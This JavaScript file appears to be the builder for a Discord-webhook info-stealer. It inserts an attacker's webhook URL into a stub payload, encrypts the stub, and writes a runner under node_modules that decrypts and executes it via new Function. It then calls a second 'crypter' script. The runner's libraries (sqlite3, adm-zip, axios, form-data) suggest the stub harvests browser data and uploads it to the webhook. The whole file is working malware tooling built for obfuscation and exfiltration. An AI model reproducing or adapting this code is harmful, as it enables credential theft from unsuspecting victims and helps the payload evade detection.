const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { spawn } = require('child_process');
const { encrypt, decrypt, executeSecondCrypterScript } = require('./crypto-utils');

const PLACEHOLDERS = {
  DISCORD: 'REMPLACE_ME'
};

async function main() {
  try {
    const configPath = path.resolve(__dirname, '../gui/info.json');
    const config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
    const stubPath = path.resolve(__dirname, 'stub.js');
    const originalStub = fs.readFileSync(stubPath, 'utf8');
    
    const modifiedStub = originalStub.replace(new RegExp(PLACEHOLDERS.DISCORD, 'g'), config.discordWebhookURL);

    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(secret).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(modifiedStub, encryptionKey);

    const runnerCode = `
const crypto = require('crypto');
const AdmZip = require('adm-zip');
const fetch = require('axios');
const sqlite3 = require('sqlite3');
const FormData = require('form-data');

${decrypt.toString()}

const decrypted = decrypt(
  "${encryptedData}", 
  "${encryptionKey}", 
  "${salt}", 
  "${iv}"
);
new Function('require', decrypted)(require);
`;

    const targetDir = path.join(__dirname, 'node_modules');
    if (!fs.existsSync(targetDir)) fs.mkdirSync(targetDir);
    fs.writeFileSync(path.join(targetDir, 'input.js'), runnerCode);

    console.log('Runner file created successfully');
    
    setTimeout(() => {
      fs.writeFileSync(stubPath, originalStub, 'utf8');
      executeSecondCrypterScript();
    }, 1000);

  } catch (error) {
    console.error(`Process failed: ${error.message}`);
    process.exit(1);
  }
}

main();
